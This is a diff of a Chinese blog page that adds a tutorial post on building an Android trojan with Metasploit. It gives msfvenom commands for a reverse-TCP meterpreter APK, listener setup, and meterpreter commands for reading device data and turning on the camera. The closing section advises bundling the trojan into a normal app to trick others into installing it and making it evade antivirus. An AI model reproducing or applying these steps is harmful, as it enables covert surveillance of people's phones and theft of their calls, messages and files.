@@ -6,18 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://fjhack.me">
-  <title>晚睡早起学习好！</title>
+  <title>利用kali和pentestbox下的msf生成安卓木马 | 晚睡早起学习好！</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生存地">
+  <meta name="description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="晚睡早起学习好！">
+<meta property="og:title" content="利用kali和pentestbox下的msf生成安卓木马">
 <meta property="og:url" content="http://fjhack.me/2017/04/06/05/index.html">
 <meta property="og:site_name" content="晚睡早起学习好！">
-<meta property="og:description" content="生存地">
-<meta property="og:updated_time" content="2017-04-06T06:26:50.998Z">
+<meta property="og:description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
+<meta property="og:image" content="http://fjhack.me/img/5.png">
+<meta property="og:image" content="http://fjhack.me/img/6.png">
+<meta property="og:image" content="http://fjhack.me/img/7.png">
+<meta property="og:image" content="http://fjhack.me/img/8.png">
+<meta property="og:updated_time" content="2017-04-06T16:12:50.087Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="晚睡早起学习好！">
-<meta name="twitter:description" content="生存地">
+<meta name="twitter:title" content="利用kali和pentestbox下的msf生成安卓木马">
+<meta name="twitter:description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
+<meta name="twitter:image" content="http://fjhack.me/img/5.png">
   
     <link rel="alternative" href="/atom.xml" title="晚睡早起学习好！" type="application/atom+xml">
   
@@ -156,9 +161,53 @@
             <article id="post-05" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用kali和pentestbox下的msf生成安卓木马
+    </h1>
+  
+
+        
+        <a href="/2017/04/06/05/" class="archive-article-date">
+  	<time datetime="2017-04-06T06:26:50.998Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-06</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。</p>
+<a id="more"></a>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">kalilinux :</span></div><div class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="number">10.20</span><span class="number">.72</span><span class="number">.178</span> LPORT=<span class="number">5555</span> R &gt; <span class="regexp">/root/</span><span class="number">1.</span>apk</div></pre></td></tr></table></figure>
+<p><img src="/img/5.png" alt="img"></p>
+<p>pentestbox :<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="number">10.20</span><span class="number">.72</span><span class="number">.178</span> LPORT=<span class="number">5555</span> R &gt; <span class="string">F:</span>/<span class="number">1.</span>apk</div></pre></td></tr></table></figure><br><img src="/img/6.png" alt="img"></p>
+<p>上面的命令大概就是利用msf生成一个可以回连侦听的APK安卓木马后门，LHOST填写你的本机IP，LPORT填写你要侦听的端口号，然后把文件重定向输出到你要的目录。</p>
+<p>注：kali 2.0版本以后msf的生成pyload命令改成了msfvenom -p</p>
+<p>pentestbox:</p>
+<p>在kalilinux下默认集成了msf，如果在Windows下使用msf，可以下载pentestbox，pentestbox是一款工具包，penbox下继承了大部分kali的工具，比如beef，burp，sqlmap等等，msf也集成了进去，所以总体来说还是很强大的。</p>
+<p>当我们生成了APK木马后，然后我们配置msf，调用它的一个TCP反弹shell的载荷</p>
+<p>命令如下：<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msfconsole【打开msf】</div><div class="line"></div><div class="line">use exploit/multi/hander</div><div class="line"></div><div class="line"><span class="keyword">set</span> payload <span class="comment">android</span>/meterpreter/<span class="comment">reverse_tcp</span>【选择<span class="comment">payload</span>】 </div><div class="line"></div><div class="line">show <span class="comment">options</span> 【查看参数情况】</div></pre></td></tr></table></figure></p>
+<p>注：pentestbox命令一样</p>
+<p><img src="/img/7.png" alt="img"></p>
+<p>从上面的图片我们可以看到，我们还没有设置要侦听的IP和端口信息，所以我们设置端口侦听。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">rhost</span> 10<span class="selector-class">.20</span><span class="selector-class">.72</span><span class="selector-class">.178</span> <span class="selector-attr">[这里设置的监听IP和刚刚生成的木马IP一样]</span></div><div class="line"></div><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">rport</span> 5555 <span class="selector-attr">[设置刚刚生成木马的端口]</span></div><div class="line"></div><div class="line"><span class="selector-tag">exploit</span> <span class="selector-attr">[开始监听]</span></div></pre></td></tr></table></figure>
+<p>当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。</p>
+<p><img src="/img/8.png" alt="img"></p>
+<p>这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。</p>
+<p>命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ifconfig 【查看端口】</div><div class="line">sysinfo   【查看系统信息】</div><div class="line">webcam <span class="type">list</span> 【查看手机存在几个摄像头】</div><div class="line">webcam_snap -i <span class="number">1</span>或<span class="number">2</span>【开启摄像头拍照】</div><div class="line">webcam_stream 【开启摄像头】</div></pre></td></tr></table></figure></p>
+<p>其他命令自己挖掘。可以利用help查看可用的命令。</p>
+<hr>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>网络问题：如果你本身的IP是内网IP，那么你最好开一个钓鱼waf，或者把这个木马捆绑到一个正常的APK应用骗别人打开，当他人和你在同一网段才能进行端口监听，当然，你也可以进行内网转发，利用花生壳，等软件进行一个外网监听，这样只要你把APK木马移植到目标手机上，那么就可以进行监听操作，当然，前提是要对方开启网络。</p>
+<p>免杀问题：现在的手机一般都是自带杀软，或者第三方杀软，msf生成的木马默认不是免杀的，所以在具体情况下要针对进行免杀。</p>
+<p>：）</p>
+<p>内网转发的教程明天在写</p>
+<p>pentestbox下载链接：<a href="http://pan.baidu.com/s/1qYU9nsg" target="_blank" rel="external">下载</a></p>
+<p>kalilinux下载链接：<a href="http://pan.baidu.com/s/1bpiW91l" target="_blank" rel="external">下载</a><br><!-- UY BEGIN --></p>
+<p><div id="uyan_frame"></div></p>
+<p><script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2129863"></script><br><!-- UY END --></p>
+
       
 
       
@@ -187,6 +236,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali 安卓木马</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -359,11 +419,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">绕过Waf</a>
+                <a href="javascript:void(0)" class="js-tag color1">-渗透笔记</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透笔记</a>
+                <a href="javascript:void(0)" class="js-tag color5">kali 安卓木马</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -371,7 +431,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">-渗透笔记</a>
+                <a href="javascript:void(0)" class="js-tag color1">绕过Waf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透笔记</a>
               </li>
              
               <li class="article-tag-list-item">
